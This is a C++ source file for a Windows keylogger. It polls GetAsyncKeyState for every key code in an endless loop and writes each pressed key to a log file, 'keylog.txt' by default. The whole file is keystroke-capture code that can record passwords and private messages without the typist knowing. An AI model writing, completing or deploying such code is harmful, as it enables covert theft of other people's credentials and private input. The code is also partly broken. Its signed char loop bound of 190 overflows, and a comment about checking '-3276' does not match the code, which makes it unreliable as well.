//
// Created by actua on 5/21/2024.
//

#include "KeyLog.h"
#include <windows.h>
#include <thread>

KeyLog::KeyLog(const std::string& fname = "keylog.txt") : keyHandler(fname) {}

// Log the key to the file
void KeyLog::start() {
  // Start the thread
  std::thread logThread(&KeyLog::logLoop, this);
  // Wait for the thread to finish
  logThread.join();
}


void KeyLog::logLoop() {
  while (true) {
    // Check each key
    for (char c = 8; c <= 190; c++) {
      // If the key is pressed, the most significant bit is set
      // why we check for -3276
      // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
      if (GetAsyncKeyState(c) & 0x1) {
        // Translate the key
        std::string keyStr = Key::translateKey(c);
        // Log the key
        keyHandler.logKey(keyStr[0]);
      }
    }
    // small delay to prevent high CPU usage and to allow the thread to be joined
    Sleep(10);
  }
}




